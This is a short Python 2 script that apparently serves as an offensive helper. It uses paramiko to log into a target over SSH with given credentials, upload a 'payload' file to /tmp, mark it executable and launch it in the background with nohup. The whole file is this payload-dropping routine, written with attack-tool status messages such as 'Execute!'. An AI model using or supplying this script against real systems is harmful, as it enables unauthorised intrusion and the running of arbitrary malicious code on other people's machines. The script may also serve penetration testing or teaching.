#!/usr/bin/python2
import sys
import paramiko

def uploadExec(ipAddress, username, password, payload):
    try:
        ssh = paramiko.SSHClient()
        print "[*] Started SSH client..."
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print "[*] Set host key policy..."
        ssh.connect(ipAddress, username=username, password=password)
        print "[*] Connection Established..."
        print "[*] Opening SFTP"
        sftpClient = ssh.open_sftp()
        print "[*] Uploading..."
        sftpClient.put(payload, "/tmp/" +payload)
        print "[*] chmod..."
        ssh.exec_command("chmod a+x /tmp/" +payload)
        print "[*] Execute!"
        ssh.exec_command("nohup /tmp/" +payload+ " &")
        print "[+] Done!"
    except Exception, e:
        print "[-] Fail, printing exception for debug purpose"
        print e

if __name__ == "__main__":
    if len(sys.argv) != 5:
        sys.exit("Usage: %s <target ip> <username> <password> <payload>" %(sys.argv[0]))
    else:
        uploadExec(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

